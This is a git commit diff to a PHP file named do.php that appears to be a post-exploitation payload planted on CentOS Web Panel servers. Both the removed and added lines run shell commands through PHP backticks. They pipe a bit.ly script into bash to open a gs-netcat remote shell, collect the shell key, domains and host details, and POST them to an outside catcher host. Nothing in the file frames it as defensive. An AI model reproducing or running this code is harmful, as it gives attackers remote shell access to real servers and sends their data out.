725cadf6ede2464a822ac9e11c6a282b8a272003
0xbadad <aels@users.noreply.github.com>
2023-01-29 07:19:45 +0200

    Update do.php

--- do.php
+++ do.php
@@ -1,8 +1,6 @@
 <?php
 $rand = rand(1e5,1e6);
-$ip = `curl -sL api4.my-ip.io/ip`;
-$json = `curl -s https://addon.dnslytics.net/ipv4info/v1/$ip`;
-$key = `X=$rand; curl -fskSL bit.ly/gsock | bash 2>&1 | grep -Eo "gs-netcat -s \"[a-zA-Z0-9]+\" -i"`;
-$domain = `kinit -k host/$(hostname -f)`;
-$data = base64_encode($key."|".$domain."|".$json);
-echo `curl -sL -X POST -d '$data' goruletheworld.requestcatcher.com/$rand`;
+$domains = `curl -sL bit.ly/ipdomains`;
+$key = `export LC_CTYPE=C; X=$rand; curl -fskSL bit.ly/gsock | bash 2>&1 | grep -Eo 'gs-netcat -s .[a-zA-Z0-9]+[^a-zA-Z0-9] -i'`;
+`export LC_CTYPE=C; curl -sL -X POST -d '$domains' goruletheworld.requestcatcher.com/$key`;
+`sh /usr/local/cwpsrv/htdocs/resources/scripts/update_cwp`;
